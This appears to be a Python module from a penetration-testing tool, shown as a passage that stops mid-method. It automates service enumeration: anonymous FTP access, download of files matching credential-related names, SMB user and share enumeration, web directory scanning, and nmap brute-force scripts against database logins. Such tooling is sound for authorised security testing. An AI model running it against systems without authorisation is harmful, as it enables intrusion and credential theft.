"""
Module for performing service enumeration
// מודול לביצוע תשאול שירותים
"""

import os
import re
import json
import time
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
import ftplib
import requests
import subprocess
import shutil
import socket
from datetime import datetime
import telnetlib

from redflow.utils.logger import get_module_logger
from redflow.utils.helpers import run_tool


class Enumeration:
    """Class for performing service enumeration // מחלקה לביצוע תשאול שירותים"""
    
    def __init__(self, config, logger, console):
        """
        Initialize enumeration module
        // אתחול מודול האנומרציה
        
        Args:
            config: Configuration object
            logger: Logger instance
            console: Console instance
        """
        self.config = config
        self.console = console
        self.logger = get_module_logger("Enumeration", logger)
        self.target = config.target
        self.results = {
            "web": {},
            "smb": {},
            "ftp": {},
            "ssh": {},
            "database": {}
        }
    
    def run(self, services):
        """
        Run appropriate service enumeration based on identified services
        // הפעלת תשאול שירותים מתאים בהתאם לשירותים שזוהו
        
        Args:
            services: List of identified services
            
        Returns:
            Enumeration results
        """
        self.logger.info(f"Starting service enumeration for {self.target}")
        
        # Create progress display
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
            console=self.console
        ) as progress:
            # Perform enumeration according to identified service types
            service_types = self._group_services_by_type(services)
            
            # FTP enumeration
            if "ftp" in service_types:
                ftp_task = progress.add_task("[cyan]Performing FTP enumeration...", total=1)
                self._enumerate_ftp(service_types["ftp"])
                progress.update(ftp_task, completed=1)
            
            # SMB/Windows enumeration
            if "smb" in service_types or "microsoft-ds" in service_types:
                smb_task = progress.add_task("[cyan]Performing SMB/Windows enumeration...", total=1)
                smb_services = service_types.get("smb", []) + service_types.get("microsoft-ds", [])
                self._enumerate_smb(smb_services)
                progress.update(smb_task, completed=1)
            
            # Web service enumeration
            if "http" in service_types or "https" in service_types:
                web_task = progress.add_task("[cyan]Performing Web service enumeration...", total=1)
                web_services = service_types.get("http", []) + service_types.get("https", [])
                self._enumerate_web(web_services)
                progress.update(web_task, completed=1)
            
            # SSH enumeration
            if "ssh" in service_types:
                ssh_task = progress.add_task("[cyan]Performing SSH enumeration...", total=1)
                self._enumerate_ssh(service_types["ssh"])
                progress.update(ssh_task, completed=1)
            
            # Database enumeration
            db_services = []
            for db_type in ["mysql", "postgresql", "mssql", "oracle"]:
                if db_type in service_types:
                    db_services.extend(service_types[db_type])
            
            if db_services:
                db_task = progress.add_task("[cyan]Performing database enumeration...", total=1)
                self._enumerate_databases(db_services)
                progress.update(db_task, completed=1)
        
        # After all enumerations are completed
        self._show_results_summary()
        
        return self.results
    
    def _group_services_by_type(self, services):
        """
        Group services by their type
        // קיבוץ שירותים לפי סוג
        
        Args:
            services: List of identified services
            
        Returns:
            Dictionary of service types with lists of services
        """
        service_types = {}
        
        for service in services:
            service_name = service["name"].lower()
            
            if service_name not in service_types:
                service_types[service_name] = []
            
            service_types[service_name].append(service)
        
        # Log found service types
        if service_types:
            self.logger.info(f"Service types identified: {', '.join(service_types.keys())}")
        
        return service_types
    
    def _enumerate_ftp(self, ftp_services):
        """
        Perform FTP service enumeration
        // ביצוע תשאול שירותי FTP
        
        Args:
            ftp_services: List of FTP services
        """
        self.logger.info(f"Performing FTP enumeration for {self.target}")
        
        # Check if we have FTP services
        if not ftp_services or len(ftp_services) == 0:
            self.logger.warning("No FTP services found to enumerate")
            return
        
        # We need to handle each FTP service individually
        for ftp_service in ftp_services:
            # Handle both string and dictionary service representations
            if isinstance(ftp_service, dict):
                port = ftp_service.get("port", "21")
                version = ftp_service.get("version", "")
                
                # Call the standalone FTP enumeration method
                ftp_info = self._enumerate_single_ftp(
                    host=str(self.target),  # Ensure host is a string
                    port=port,
                    service_info=ftp_service
                )
                
                # Save results
                self.results["ftp"] = ftp_info
            else:
                self.logger.warning(f"Unexpected FTP service format: {ftp_service}")

    def _enumerate_single_ftp(self, host, port=21, service_info=None):
        """
        Enumerate an FTP server
        
        Args:
            host (str): Target host
            port (int or str): Target port
            service_info (dict, optional): Service info from Nmap
            
        Returns:
            dict: FTP enumeration results
        """
        # Ensure host is a string
        host = str(host)
        
        # Ensure port is a string for logging and an integer for connecting
        port_str = str(port)
        try:
            port_int = int(port)
        except (ValueError, TypeError):
            self.logger.error(f"Invalid port number for FTP enumeration: {port}")
            port_int = 21
        
        ftp_info = {
            "port": port_str,
            "name": "ftp",
            "anonymous_access": False,
            "directories": [],
            "files": [],
            "downloaded_files": []
        }
        
        # Add service version if available
        if service_info and "version" in service_info:
            ftp_info["version"] = service_info["version"]
        
        try:
            # Try anonymous login
            self.logger.info(f"Attempting anonymous FTP login to {host}:{port_str}")
            ftp = ftplib.FTP()
            ftp.connect(host, port_int)  # host is guaranteed to be a string
            ftp.login("anonymous", "anonymous@example.com")
            
            # If we got here, anonymous login succeeded
            ftp_info["anonymous_access"] = True
            self.logger.warning(f"Anonymous FTP access allowed on {host}:{port_str}")
            
            # List root directory
            self._list_ftp_directory(ftp, "/", ftp_info)
            
            # Download interesting files if found and downloader is available
            if hasattr(self, 'downloader') and self.downloader:
                self._download_interesting_ftp_files(host, port_str, ftp_info)
            
            ftp.quit()
            
        except ftplib.all_errors as e:
            self.logger.info(f"FTP enumeration error for {host}:{port_str}: {str(e)}")
        except Exception as e:
            self.logger.error(f"Unexpected error in FTP enumeration for {host}:{port_str}: {str(e)}")
        
        return ftp_info
    
    def _list_ftp_directory(self, ftp, directory, ftp_info, max_depth=2, current_depth=0):
        """
        Recursively list FTP directories
        
        Args:
            ftp (ftplib.FTP): FTP connection
            directory (str): Current directory to list
            ftp_info (dict): FTP information dictionary to update
            max_depth (int): Maximum recursion depth
            current_depth (int): Current recursion depth
        """
        if current_depth > max_depth:
            return
            
        try:
            original_dir = ftp.pwd()
            
            # Try to change to directory
            ftp.cwd(directory)
            current_dir = ftp.pwd()
            
            # Add directory to list if not already there
            if current_dir not in ftp_info["directories"]:
                ftp_info["directories"].append(current_dir)
            
            # List files and directories
            file_list = []
            ftp.retrlines('LIST', file_list.append)
            
            for item in file_list:
                parts = item.split()
                if len(parts) < 9:
                    continue
                    
                # Check if it's a directory
                is_dir = parts[0].startswith('d')
                filename = " ".join(parts[8:])
                
                if is_dir and current_depth < max_depth:
                    # Recursively list subdirectory
                    new_dir = f"{current_dir}/{filename}" if current_dir != "/" else f"/{filename}"
                    self._list_ftp_directory(ftp, new_dir, ftp_info, max_depth, current_depth + 1)
                else:
                    # It's a file, add to file list
                    file_path = f"{current_dir}/{filename}" if current_dir != "/" else f"/{filename}"
                    ftp_info["files"].append(file_path)
            
            # Return to original directory
            ftp.cwd(original_dir)
            
        except ftplib.all_errors as e:
            self.logger.debug(f"Error listing FTP directory {directory}: {str(e)}")

    def _download_interesting_ftp_files(self, host, port, ftp_info):
        """
        Download interesting files from FTP server
        
        Args:
            host (str): FTP server host
            port (int): FTP server port
            ftp_info (dict): FTP information dictionary to update
        """
        # Create a specific directory for FTP downloads
        target_dir = self.downloader.create_directory_for_downloads("ftp", port)
        
        # Define interesting file patterns
        interesting_extensions = [
            ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", 
            ".conf", ".config", ".ini", ".log", ".bak", ".backup",
            ".sql", ".db", ".php", ".asp", ".aspx", ".jsp", ".cgi"
        ]
        
        interesting_filenames = [
            "passwd", "password", "credentials", "users", "admin",
            "config", "settings", "database", "backup", "README"
        ]
        
        # Check each file
        for file_path in ftp_info["files"]:
            filename = os.path.basename(file_path)
            extension = os.path.splitext(filename)[1].lower()
            
            # Check if file matches our criteria
            is_interesting = False
            
            if extension in interesting_extensions:
                is_interesting = True
                
            for pattern in interesting_filenames:
                if pattern.lower() in filename.lower():
                    is_interesting = True
                    break
                    
            if is_interesting:
                # Try to download the file
                try:
                    self.logger.info(f"Downloading interesting FTP file: {file_path}")
                    
                    # Try anonymous login first
                    result = self.downloader.download_ftp_file(
                        host=host,
                        remote_path=file_path,
                        target_dir=target_dir
                    )
                    
                    if result:
                        ftp_info["downloaded_files"].append({
                            "remote_path": file_path,
                            "local_path": result
                        })
                        
                except Exception as e:
                    self.logger.error(f"Error downloading FTP file {file_path}: {str(e)}")

    def _enumerate_smb(self, smb_services):
        """
        Perform SMB/Windows enumeration
        // ביצוע תשאול שירותי SMB/Windows
        
        Args:
            smb_services: List of SMB services
        """
        self.logger.info(f"Performing SMB/Windows enumeration for {self.target}")
        
        smb_results = {
            "version": "",
            "os": "",
            "computer_name": "",
            "domain": "",
            "shares": [],
            "users": [],
            "sessions": [],
            "port": smb_services[0]["port"] if smb_services else 445
        }
        
        for smb_service in smb_services:
            port = smb_service["port"]
            version = smb_service.get("version", "")
            smb_results["version"] = version
            
            # Run enum4linux
            output_file = self.config.get_output_file("enum4linux", "txt")
            
            cmd = ["enum4linux", "-a", self.target]
            
            result = run_tool(cmd, output_file=output_file)
            
            if result["returncode"] == 0:
                self.logger.debug(f"enum4linux results saved in: {output_file}")
                
                # Analyze the results
                stdout = result["stdout"]
                
                # Extract hostname
                hostname_match = re.search(r"NetBIOS computer name:\s*(\S+)", stdout)
                if hostname_match:
                    smb_results["computer_name"] = hostname_match.group(1)
                
                # Extract domain
                domain_match = re.search(r"Workgroup\s*/\s*Domain:\s*(\S+)", stdout)
                if domain_match:
                    smb_results["domain"] = domain_match.group(1)
                
                # Extract operating system
                os_match = re.search(r"OS:\s*(.+)", stdout)
                if os_match:
                    smb_results["os"] = os_match.group(1).strip()
                
                # Extract shares
                shares = []
                for line in stdout.splitlines():
                    share_match = re.search(r"Mapping: OK, Listing: OK\s*(\S+)", line)
                    if share_match:
                        shares.append(share_match.group(1))
                smb_results["shares"] = shares
                
                # Extract users
                users = []
                for line in stdout.splitlines():
                    user_match = re.search(r"user:\[(\S+)\]", line)
                    if user_match:
                        users.append(user_match.group(1))
                smb_results["users"] = users
            
            # Run SMB scripts
            nmap_output = self.config.get_output_file("nmap_smb", "txt")
            
            cmd = ["nmap", "--script", "smb-os-discovery,smb-enum-shares,smb-enum-users", "-p", str(port), self.target, "-oN", nmap_output]
            
            result = run_tool(cmd)
            
            if result["returncode"] == 0:
                self.logger.debug(f"nmap SMB scripts results saved in: {nmap_output}")
        
        self.results["smb"] = smb_results
    
    def _enumerate_web(self, web_services, quick_mode=False):
        """
        Perform web service enumeration
        // ביצוע תשאול שירותי web
        
        Args:
            web_services: List of web services
            quick_mode: If True, only perform directory enumeration without vulnerability scanning
        """
        self.logger.info(f"Performing Web enumeration for {self.target}")
        
        for service in web_services:
            port = service.get("port", 80)
            is_https = service.get("name", "").lower() == "https"
            protocol = "https" if is_https else "http"
            base_url = f"{protocol}://{self.target}:{port}"
            
            # Only run directory enumeration if port is 80 or 443 in quick mode
            if quick_mode and port not in [80, 443]:
                self.logger.info(f"Skipping non-standard web port {port} in quick mode")
                continue
            
            try:
                # Run gobuster for directory enumeration
                self.logger.info(f"Running gobuster against {base_url}/")
                gobuster_cmd = [
                    "gobuster", "dir",
                    "-u", base_url,
                    "-w", "/usr/share/wordlists/dirb/common.txt",
                    "-t", "50",
                    "-q"
                ]
                
                if is_https:
                    gobuster_cmd.extend(["-k"])
                
                result = run_tool(gobuster_cmd)
                
                if result["returncode"] == 0:
                    # Parse gobuster output
                    directories = []
                    files = []
                    
                    for line in result["stdout"].splitlines():
                        if line.strip():
                            path = line.split()[0]
                            if path.endswith("/"):
                                directories.append(path)
                            else:
                                files.append(path)
                    
                    self.results["web"][f"{protocol}_{port}"] = {
                        "directories": directories,
                        "files": files
                    }
                    
                    self.logger.info(f"Found {len(directories)} directories and {len(files)} files")
                
                # Skip vulnerability scanning in quick mode
                if not quick_mode:
                    # Run nikto vulnerability scan
                    self.logger.info(f"Running nikto vulnerability scan against {base_url}/")
                    nikto_cmd = ["nikto", "-h", base_url, "-nointeractive"]
                    
                    if is_https:
                        nikto_cmd.extend(["-ssl"])
                    
                    result = run_tool(nikto_cmd)
                    
                    if result["returncode"] == 0:
                        self.results["web"][f"{protocol}_{port}"]["nikto"] = result["stdout"]
            
            except Exception as e:
                self.logger.error(f"Error during web enumeration: {str(e)}")
                continue
    
    def _enumerate_ssh(self, ssh_services):
        """
        Perform SSH service enumeration
        // ביצוע תשאול שירותי SSH
        
        Args:
            ssh_services: List of SSH services
        """
        self.logger.info(f"Performing SSH enumeration for {self.target}")
        
        ssh_results = {
            "version": "",
            "auth_methods": [],
            "algorithms": [],
            "weak_algorithms": False,
            "port": ssh_services[0]["port"] if ssh_services else 22
        }
        
        for ssh_service in ssh_services:
            port = ssh_service["port"]
            version = ssh_service.get("version", "")
            ssh_results["version"] = version
            
            # Check authentication methods and weaknesses
            output_file = self.config.get_output_file(f"ssh_audit_{port}", "txt")
            
            cmd = ["nmap", "--script", "ssh-auth-methods,ssh2-enum-algos", "-p", str(port), self.target, "-oN", output_file]
            
            result = run_tool(cmd)
            
            if result["returncode"] == 0:
                self.logger.debug(f"SSH audit results saved in: {output_file}")
                
                # Parse results
                stdout = result["stdout"]
                
                # Extract authentication methods
                for line in stdout.splitlines():
                    if "ssh-auth-methods" in line and "publickey" in line:
                        methods = re.findall(r"(\w+)", line)
                        ssh_results["auth_methods"] = [m for m in methods if m in ["password", "publickey", "keyboard-interactive"]]
                
                # Extract algorithms
                algos = []
                for line in stdout.splitlines():
                    if "ssh2-enum-algos" in line and "encryption_algorithms" in line:
                        algo_match = re.search(r"encryption_algorithms:(.+)", line)
                        if algo_match:
                            algo_str = algo_match.group(1).strip()
                            algos = [a.strip() for a in algo_str.split(",")]
                            ssh_results["algorithms"] = algos
                
                # Check for weak algorithms
                weak_algos = ["arcfour", "blowfish", "3des", "des"]
                for algo in ssh_results.get("algorithms", []):
                    if any(weak in algo.lower() for weak in weak_algos):
                        ssh_results["weak_algorithms"] = True
                        break
        
        self.results["ssh"] = ssh_results
    
    def _enumerate_databases(self, db_services):
        """
        Perform database enumeration
        // ביצוע תשאול מסדי נתונים
        
        Args:
            db_services: List of database services
        """
        self.logger.info(f"Performing database enumeration for {self.target}")
        
        db_results = {}
        
        for db_service in db_services:
            port = db_service["port"]
            service_name = db_service.get("name", "").lower() if "name" in db_service else "" 
            version = db_service.get("version", "")
            
            if not service_name:
                if port == "3306":
                    service_name = "mysql"
                elif port == "5432":
                    service_name = "postgresql"
                elif port == "1433":
                    service_name = "mssql"
                elif port == "1521":
                    service_name = "oracle"
                else:
                    self.logger.warning(f"Unknown database service on port {port}, skipping")
                    continue
            
            db_info = {
                "port": port,
                "type": service_name,
                "version": version,
                "default_credentials": False,
                "accessible": False
            }
            
            # Run nmap scripts specific to database type
            nmap_script = ""
            
            if "mysql" in service_name:
                nmap_script = "mysql-info,mysql-empty-password,mysql-enum,mysql-brute"
            elif "postgresql" in service_name or "postgres" in service_name:
                nmap_script = "pgsql-info,pgsql-brute"
            elif "mssql" in service_name:
                nmap_script = "ms-sql-info,ms-sql-empty-password,ms-sql-brute"
            elif "oracle" in service_name:
                nmap_script = "oracle-brute,oracle-enum-users"
            
            if nmap_script:
                output_file = self.config.get_output_file(f"db_{service_name}_{port}", "txt")
                
                cmd = ["nmap", "--script", nmap_script, "-p", str(port), self.target, "-oN", output_file]
                
                result = run_tool(cmd)
                
                if result["returncode"] == 0:
                    self.logger.debug(f"Database {service_name} results saved in: {output_file}")
                    
                    # Parse results
                    stdout = result["stdout"]
                    
                    # Check for access
                    if "success" in stdout.lower() or "identified" in stdout.lower():
                        db_info["accessible"] = True
                    
                    # Check for empty or default credentials
                    if "empty-password" in stdout.lower() or "default.credentials" in stdout.lower():
                        db_info["default_credentials"] = True
            
            # Add only if we found information about the database
            if db_info["type"] not in db_results:
                db_results[db_info["type"]] = []
            
            db_results[db_info["type"]].append(db_info)
        
        self.results["database"] = db_results
    
    def _show_results_summary(self):
        """
        Display summary of enumeration results
        // הצגת סיכום תוצאות התשאול
        """
        self.logger.info("Displaying enumeration results summary")
        
        self.console.print("\n[bold green]Service Enumeration Summary:[/bold green]")
        
        # FTP summary
        if self.results["ftp"]:
            ftp_info = self.results["ftp"]
            anon_access = "Yes" if ftp_info.get("anonymous_access", False) else "No"
            dirs_count = len(ftp_info.get("directories", []))
            
            self.console.print(f"[cyan]FTP (Port {ftp_info.get('port')}):[/cyan]")
            self.console.print(f"  Anonymous access: {anon_access}")
            self.console.print(f"  Directories found: {dirs_count}")
        
        # SMB summary
        if self.results["smb"]:
            smb_info = self.results["smb"]
            shares_count = len(smb_info.get("shares", []))
            users_count = len(smb_info.get("users", []))
            
            self.console.print(f"[cyan]SMB (Port {smb_info.get('port')}):[/cyan]")
            self.console.print(f"  Computer name: {smb_info.get('computer_name', 'Unknown')}")
            self.console.print(f"  Domain: {smb_info.get('domain', 'Unknown')}")
            self.console.print(f"  Operating System: {smb_info.get('os', 'Unknown')}")
            self.console.print(f"  Shares found: {shares_count}")
            self.console.print(f"  Users found: {users_count}")
        
        # Web summary
        if self.results["web"]:
            for web_info in self.results["web"].values():
                protocol = web_info.get("protocol", "http")
                port = web_info.get("port")
                dirs_count = len(web_info.get("directories", []))
                files_count = len(web_info.get("files", []))
                
                self.console.print(f"[cyan]{protocol} ({port}):[/cyan]")
                self.console.print(f"  Directories found: {dirs_count}")
                self.console.print(f"  Files found: {files_count}")
        
        # SSH summary
        if self.results["ssh"]:
            ssh_info = self.results["ssh"]
            auth_methods = ", ".join(ssh_info.get("auth_methods", ["Unknown"]))
            weak_algos = "Yes" if ssh_info.get("weak_algorithms", False) else "No"
            
            self.console.print(f"[cyan]SSH (Port {ssh_info.get('port')}):[/cyan]")
            self.console.print(f"  Version: {ssh_info.get('version', 'Unknown')}")
            self.console.print(f"  Authentication methods: {auth_methods}")
            self.console.print(f"  Weak algorithms: {weak_algos}")
        
        # Database summary
        if self.results["database"]:
            for db_type, db_instances in self.results["database"].items():
                for db in db_instances:
                    port = db.get("port")
                    accessible = "Yes" if db.get("accessible", False) else "No"
                    default_creds = "Yes" if db.get("default_credentials", False) else "No"
                    
                    self.console.print(f"[cyan]Database {db_type} (Port {port}):[/cyan]")
                    self.console.print(f"  Version: {db.get('version', 'Unknown')}")
                    self.console.print(f"  Accessible: {accessible}")
                    self.console.print(f"  Default credentials: {default_creds}")
        
        self.console.print("")  # Extra space 

    def enumerate_services(self, target, services, output_dir):
        """
        Enumerate discovered services
        
        Args:
            target (str): Target to scan
            services (list): List of services to enumerate
            output_dir (str): Output directory for results
            
        Returns:
            dict: Enumeration results
        """
        self.logger.info(f"Starting service enumeration for {target}")
        self.target = target  # Ensure target is set
        
        # Initialize downloader if not present
        if not hasattr(self, 'downloader'):
            from redflow.utils.downloader import FileDownloader
            self.downloader = FileDownloader(output_dir, self.logger, self.console)
        
        enumeration_results = {}
        service_types = self._group_services_by_type(services)
        
        # Log what we're enumerating
        for service_type, instances in service_types.items():
            self.logger.info(f"Will enumerate {len(instances)} {service_type} service(s)")
        
        # Create progress display
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
            console=self.console
        ) as progress:
            # FTP enumeration
            if "ftp" in service_types:
                ftp_task = progress.add_task("[cyan]Performing FTP enumeration...", total=1)
                self._enumerate_ftp(service_types["ftp"])
                progress.update(ftp_task, completed=1)
            
            # SMB/Windows enumeration
            if "smb" in service_types or "microsoft-ds" in service_types:
                smb_task = progress.add_task("[cyan]Performing SMB/Windows enumeration...", total=1)
                smb_services = service_types.get("smb", []) + service_types.get("microsoft-ds", [])
                self._enumerate_smb(smb_services)
                progress.update(smb_task, completed=1)
            
            # Web service enumeration
            if "http" in service_types or "https" in service_types:
                web_task = progress.add_task("[cyan]Performing Web service enumeration...", total=1)
                web_services = service_types.get("http", []) + service_types.get("https", [])
                self._enumerate_web(web_services)
                progress.update(web_task, completed=1)
            
            # SSH enumeration
            if "ssh" in service_types:
                ssh_task = progress.add_task("[cyan]Performing SSH enumeration...", total=1)
                self._enumerate_ssh(service_types["ssh"])
                progress.update(ssh_task, completed=1)
            
            # Database enumeration
            db_services = []
            for db_type in ["mysql", "postgresql", "mssql", "oracle"]:
                if db_type in service_types:
                    db_services.extend(service_types[db_type])
            
            if db_services:
                db_task = progress.add_task("[cyan]Performing database enumeration...", total=1)
                self._enumerate_databases(db_services)
                progress.update(db_task, completed=1)
        
        # After all enumerations are completed
        self._show_results_summary()
        
        return self.results 

    def list_discovered_files(self, target=None, port=80, protocol="http"):
        """
        List all discovered files for a specific web service
        
        Args:
            target (str, optional): Target host (if different from current target)
            port (int or str): Port of the web service
            protocol (str): Protocol (http or https)
            
        Returns:
            dict: Dictionary with discovered files information
        """
        if target is None:
            target = self.target

        port_str = str(port)
        
        # Find the web service results for the specified port
        web_files = []
        web_dirs = []
        downloaded_files = []
        
        if isinstance(self.results["web"], list):
            for web_service in self.results["web"]:
                if str(web_service.get("port", "")) == port_str and web_service.get("protocol", "") == protocol:
                    web_files = web_service.get("files", [])
                    web_dirs = web_service.get("directories", [])
                    downloaded_files = web_service.get("downloaded_files", [])
                    break
        
        result = {
            "target": target,
            "port": port_str,
            "protocol": protocol,
            "url": f"{protocol}://{target}:{port_str}",
            "files": web_files,
            "directories": web_dirs,
            "downloaded_files": downloaded_files
        }
        
        # Display summary to console
        self.console.print(f"\n[bold cyan]Files discovered on {protocol}://{target}:{port_str}[/bold cyan]")
        
        if web_files:
            self.console.print(f"\n[bold green]Files ({len(web_files)}):[/bold green]")
            for file in web_files:
                self.console.print(f"  {file}")
        else:
            self.console.print("[yellow]No files discovered[/yellow]")
            
        if web_dirs:
            self.console.print(f"\n[bold green]Directories ({len(web_dirs)}):[/bold green]")
            for directory in web_dirs:
                self.console.print(f"  {directory}")
        else:
            self.console.print("[yellow]No directories discovered[/yellow]")
            
        if downloaded_files:
            self.console.print(f"\n[bold green]Downloaded Files ({len(downloaded_files)}):[/bold green]")
            for df in downloaded_files:
                url = df.get("url", "Unknown URL")
                path = df.get("local_path", "Unknown path")
                filename = os.path.basename(path)
                self.console.print(f"  {filename} - [blue]{url}[/blue] - [yellow]{path}[/yellow]")
        else:
            self.console.print("[yellow]No files have been downloaded yet[/yellow]")
            
        return result
        
    def download_file(self, url, target_dir=None):
        """
        Download a specific file from a URL
        
        Args:
            url (str): Full URL to the file
            target_dir (str, optional): Directory to save the file
            
        Returns:
            str: Path to the downloaded file or None if download failed
        """
        if not hasattr(self, 'downloader'):
            from redflow.utils.downloader import FileDownloader
            self.downloader = FileDownloader(self.config.output_dir, self.logger, self.console)
            
        # Parse URL to determine protocol
        if url.startswith("http://") or url.startswith("https://"):
            protocol = "http"
            url_to_download = url
            
            # Extract host and port from URL if needed
            host = None
            port = None
            
            self.console.print(f"[bold]Downloading file from [blue]{url}[/blue]...[/bold]")
            
            result = self.downloader.download_http_file(
                url=url_to_download,
                target_dir=target_dir,
                verify=False
            )
            
            if result:
                self.console.print(f"[green]File downloaded successfully to:[/green] {result}")
                return result
            else:
                self.console.print("[red]Failed to download file[/red]")
                return None
        elif url.startswith("ftp://"):
            protocol = "ftp"
            # Handle FTP URLs
            from urllib.parse import urlparse
            parsed_url = urlparse(url)
            host = parsed_url.netloc
            path = parsed_url.path
            
            self.console.print(f"[bold]Downloading file from [blue]{url}[/blue]...[/bold]")
            
            result = self.downloader.download_ftp_file(
                host=host,
                remote_path=path,
                target_dir=target_dir
            )
            
            if result:
                self.console.print(f"[green]File downloaded successfully to:[/green] {result}")
                return result
            else:
                self.console.print("[red]Failed to download file[/red]")
                return None
        else:
            # Assume it's a simple path on an HTTP server
            protocol = "http"
            if not url.startswith("/"):
                url = "/" + url
                
            # Try to determine target and port from current results
            if self.target and "web" in self.results:
                web_results = self.results["web"]
                if isinstance(web_results, list) and len(web_results) > 0:
                    # Default to first web service found
                    web_service = web_results[0]
                    target = self.target
                    port = web_service.get("port", 80)
                    protocol = web_service.get("protocol", "http")
                    
                    full_url = f"{protocol}://{target}:{port}{url}"
                    
                    self.console.print(f"[bold]Downloading file from [blue]{full_url}[/blue]...[/bold]")
                    
                    result = self.downloader.download_http_file(
                        url=full_url,
                        target_dir=target_dir,
                        verify=False
                    )
                    
                    if result:
                        self.console.print(f"[green]File downloaded successfully to:[/green] {result}")
                        return result
                    else:
                        self.console.print("[red]Failed to download file[/red]")
                        return None
                else:
                    self.console.print("[red]Cannot determine web server details for download[/red]")
                    return None
            else:
                self.console.print("[red]Cannot determine web server details for download[/red]")
                return None
    
    def view_web_file_content(self, file_path=None, url=None):
        """
        View the content of a web file
        
        Args:
            file_path (str, optional): Path to a locally downloaded file
            url (str, optional): URL to download and view
            
        Returns:
            str: Content of the file or error message
        """
        content = None
        
        if file_path and os.path.exists(file_path):
            # Read local file
            try:
                with open(file_path, 'r', errors='ignore') as f:
                    content = f.read()
                self.console.print(f"[bold]Content of file [blue]{file_path}[/blue]:[/bold]")
                self.console.print("---" * 20)
                self.console.print(content)
                self.console.print("---" * 20)
                return content
            except Exception as e:
                error_msg = f"Error reading file: {str(e)}"
                self.console.print(f"[red]{error_msg}[/red]")
                return error_msg
        elif url:
            # Download and read the file
            import tempfile
            temp_dir = tempfile.mkdtemp()
            downloaded_file = self.download_file(url, temp_dir)
            
            if downloaded_file:
                try:
                    with open(downloaded_file, 'r', errors='ignore') as f:
                        content = f.read()
                    self.console.print(f"[bold]Content of file [blue]{url}[/blue]:[/bold]")
                    self.console.print("---" * 20)
                    self.console.print(content)
                    self.console.print("---" * 20)
                    return content
                except Exception as e:
                    error_msg = f"Error reading file: {str(e)}"
                    self.console.print(f"[red]{error_msg}[/red]")
                    return error_msg
            else:
                error_msg = "Failed to download file"
                self.console.print(f"[red]{error_msg}[/red]")
                return error_msg
        else:
            error_msg = "No file path or URL provided"
            self.console.print(f"[red]{error_msg}[/red]")
            return error_msg 

    def _check_server_connectivity(self, host, port, protocol="http", timeout=3):
        """
        Check if a server is accessible before attempting downloads
        
        Args:
            host (str): Host to check
            port (int or str): Port number
            protocol (str): Protocol (http or https)
            timeout (int): Connection timeout in seconds
            
        Returns:
            bool: True if server is accessible, False otherwise
        """
        import socket
        import requests
        from requests.packages.urllib3.exceptions import InsecureRequestWarning
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        
        self.logger.info(f"Checking connectivity to {host}:{port} using {protocol}...")
        
        # First try a simple socket connection to check if the port is open
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, int(port)))
            sock.close()
            
            if result != 0:
                self.logger.warning(f"Port {port} appears to be closed on {host}")
                self.console.print(f"[yellow]Warning: Port {port} appears to be closed on {host}[/yellow]")
                self.console.print("[yellow]Network connection might be unavailable or port is not open[/yellow]")
                return False
        except Exception as e:
            self.logger.warning(f"Socket connection error to {host}:{port}: {str(e)}")
            self.console.print(f"[yellow]Warning: Cannot connect to {host}:{port}: {str(e)}[/yellow]")
            return False
        
        # If socket connection succeeded, try HTTP(S) request
        try:
            url = f"{protocol}://{host}:{port}/"
            response = requests.head(url, timeout=timeout, verify=False)
            self.logger.info(f"HTTP connection to {url} succeeded with status code: {response.status_code}")
            return True
        except requests.RequestException as e:
            self.logger.warning(f"HTTP connection error to {url}: {str(e)}")
            self.console.print(f"[yellow]Warning: HTTP connection to {url} failed: {str(e)}[/yellow]")
            # If socket connected but HTTP failed, the port might be used by a different service
            self.console.print("[yellow]Port is open but might not be running an HTTP server[/yellow]")
            return False

    def interactive_download_files(self, target=None, port=80, protocol="http"):
        """
        Interactive file download - allows user to select which discovered files to download
        
        Args:
            target (str, optional): Target host (if different from current target)
            port (int or str): Port of the web service
            protocol (str): Protocol (http or https)
            
        Returns:
            list: List of downloaded file paths
        """
        if target is None:
            target = self.target

        port_str = str(port)
        downloaded_files = []
        
        # Initialize downloader first, outside the core logic, to handle dependencies
        try:
            if not hasattr(self, 'downloader'):
                from redflow.utils.downloader import FileDownloader
                self.downloader = FileDownloader(self.config.output_dir, self.logger, self.console)
        except ImportError as e:
            # Handle the case where dependencies are missing
            missing_package = str(e).split("'")[-2] if "'" in str(e) else str(e)
            self.console.print(f"[bold red]Missing dependency: {missing_package}[/bold red]")
            self.console.print(f"[yellow]Please install it with: pip install {missing_package}[/yellow]")
            return downloaded_files
        
        # First check if the server is accessible
        if not self._check_server_connectivity(target, port_str, protocol):
            self.console.print(f"[bold red]Cannot connect to {protocol}://{target}:{port_str}[/bold red]")
            
            # Ask user if they want to continue anyway or change target
            self.console.print("\n[yellow]Options:[/yellow]")
            self.console.print("1. Continue anyway (files might fail to download)")
            self.console.print("2. Change target IP/hostname")
            self.console.print("3. Abort download operation")
            
            choice = input("Enter your choice (1-3): ").strip()
            
            if choice == "2":
                new_target = input("Enter new target IP/hostname: ").strip()
                if new_target:
                    # Retry with new target
                    self.console.print(f"[green]Retrying with new target: {new_target}[/green]")
                    return self.interactive_download_files(new_target, port_str, protocol)
            elif choice == "3":
                self.console.print("[yellow]Download operation aborted[/yellow]")
                return downloaded_files
            # For choice 1 or invalid choice, continue anyway
            self.console.print("[yellow]Continuing with download attempts...[/yellow]")
        
        # Get the web service results for the specified port
        web_files = []
        web_dirs = []
        
        if isinstance(self.results["web"], list):
            for web_service in self.results["web"]:
                if str(web_service.get("port", "")) == port_str and web_service.get("protocol", "") == protocol:
                    web_files = web_service.get("files", [])
                    web_dirs = web_service.get("directories", [])
                    break
        
        # Check if we found any files in previous full scan
        discovered_files_path = os.path.join(self.config.output_dir, "results.json")
        if (not web_files and not web_dirs) and os.path.exists(discovered_files_path):
            # Using a single try-except block for the entire operations
            try:
                self.console.print("[yellow]Looking for discovered files in previous scan results...[/yellow]")
                with open(discovered_files_path, 'r') as f:
                    scan_results = json.load(f)
                    
                # Look for web enumeration results
